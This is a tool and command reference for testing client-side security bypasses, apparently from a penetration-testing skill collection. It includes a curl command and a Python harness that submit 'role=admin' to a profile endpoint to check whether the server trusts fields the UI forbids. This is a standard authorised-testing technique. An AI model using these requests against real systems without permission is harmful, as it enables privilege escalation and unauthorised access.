# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`client-side-security-bypasses`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `Burp Suite Proxy` | `Intercept the action request, edit the disabled or hidden field, then forward it` | Submit a UI-forbidden value without the browser's client-side checks running | Cross-platform |
| `curl` | `curl -sS -b jar.txt -X POST 'https://target.example/api/profile' -d 'display_name=x&role=admin'` | Call the endpoint directly, bypassing the SPA's disabled controls and route guards | Cross-platform |
| `Chrome DevTools` | `Elements panel: remove the `disabled` attribute or reveal a hidden input, Network panel: inspect the sent body` | Show that the control is client-only and capture the real request the server receives | Cross-platform |

## Minimal Script Shape

A client-trust harness: it submits the request the UI makes and the same request with a UI-forbidden field, then reads whether the server stored the forbidden value.

```python
import json
import urllib.parse
import urllib.request

ENDPOINT = 'https://target.example/api/profile'
HEADERS = {'Cookie': 'session=<authorised-session>'}

def submit(fields):
    body = urllib.parse.urlencode(fields).encode()
    req = urllib.request.Request(ENDPOINT, data=body, method='POST', headers=HEADERS)
    with urllib.request.urlopen(req, timeout=10) as r:
        return json.loads(r.read())

ui_request = submit({'display_name': 'tester'})
forbidden = submit({'display_name': 'tester', 'role': 'admin'})
stored_role = forbidden.get('role')
print({'ui_role': ui_request.get('role'), 'after_forbidden': stored_role,
       'server_trusts_client': stored_role == 'admin'})
```
